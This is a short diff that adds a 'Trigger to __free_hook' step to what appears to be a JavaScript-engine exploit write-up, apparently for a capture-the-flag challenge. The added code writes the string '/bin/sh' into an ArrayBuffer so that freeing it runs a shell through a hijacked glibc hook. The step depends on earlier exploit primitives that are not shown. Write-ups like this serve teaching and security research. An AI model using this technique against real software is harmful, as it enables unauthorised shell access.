@@ -180,3 +180,14 @@ function hex(i)
 	return "0x"+i.toString(16).padStart(16,"0");
 }
 ```
+
+# Trigger to __free_hook
+```js
+function get_shell()
+{
+    let get_shell_buffer = new ArrayBuffer(0x1000);
+    let get_shell_dataview = new DataView(get_shell_buffer);
+    get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn));
+}
+get_shell();
+```
